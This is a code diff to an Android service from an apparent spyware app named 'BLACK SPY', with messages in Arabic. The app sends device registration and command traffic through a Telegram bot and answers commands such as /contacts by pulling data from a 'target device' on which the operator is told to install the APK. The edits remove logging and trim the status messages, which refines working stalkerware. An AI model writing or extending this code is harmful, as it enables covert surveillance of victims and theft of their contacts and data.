@@ -73,14 +73,9 @@ public class TelegramBotService extends Service {
                 String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
-                int code = conn.getResponseCode();
+                conn.getResponseCode();
                 conn.disconnect();
-                if (code == 200) {
-                    Log.i("BlackSpy", "Registration sent successfully");
-                }
-            } catch (Exception e) {
-                Log.e("BlackSpy", "Registration error: " + e.getMessage());
-            }
+            } catch (Exception e) {}
         }).start();
     }
     private void startBot() {
@@ -110,12 +105,6 @@ public class TelegramBotService extends Service {
                                     deviceRegistered = true;
                                     sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
                                     sendCommandMenu();
-                                } else if (!deviceRegistered) {
-                                    targetDeviceId = deviceId;
-                                    targetDeviceName = deviceName;
-                                    deviceRegistered = true;
-                                    sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
-                                    sendCommandMenu();
                                 }
                             }
                         }
@@ -128,13 +117,13 @@ public class TelegramBotService extends Service {
         String c = cmd.trim().toLowerCase();
         if (c.equals("/start")) {
             if (targetDeviceId == null) {
-                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ جاري انتظار اتصال الجهاز...\n✅ تأكد من تثبيت APK على الجهاز المستهدف");
+                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ انتظر اتصال الجهاز...");
             } else {
                 sendCommandMenu();
             }
         } else {
             if (targetDeviceId == null) {
-                sendMessage("❌ لا يوجد جهاز مستهدف. انتظر اتصال جهاز أولاً.");
+                sendMessage("❌ لا يوجد جهاز مستهدف");
                 return;
             }
             if (c.equals("/contacts")) sendToDevice(targetDeviceId, "GET_CONTACTS");
